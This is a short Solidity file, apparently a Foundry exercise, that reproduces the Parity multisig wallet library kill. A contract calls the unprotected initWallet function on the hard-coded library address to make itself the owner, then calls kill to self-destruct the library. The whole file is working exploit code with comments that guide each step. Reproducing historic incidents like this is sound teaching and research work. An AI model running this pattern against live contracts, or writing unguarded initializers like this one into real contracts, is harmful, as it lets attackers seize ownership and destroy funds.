pragma solidity 0.8.13;

import "forge-std/Test.sol";

interface IParity {
    function isOwner(address _addr) external view returns (bool);

    function kill(address _to) external;

    function initWallet(
        address[] memory _owners,
        uint256 _required,
        uint256 _daylimit
    ) external;
}

contract ParityKill {
    address PARITY_ADDRESS = 0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4;
    IParity parity = IParity(PARITY_ADDRESS);

    function killContractByAccident() external {
        // Make sure this contract is not the owner of parity wallet!
        assert(!parity.isOwner(address(this)));

        // Make yourself owner the owner of the wallet!
        address[] memory owners = new address[](1);
        owners[0] = address(this);
        parity.initWallet(owners, 0, 0);

        // Make sure you have become the owner!
        assert(parity.isOwner(address(this)));

        // You are the owner now. What do ou do ? Kill it.
        parity.kill(address(this));
    }
}
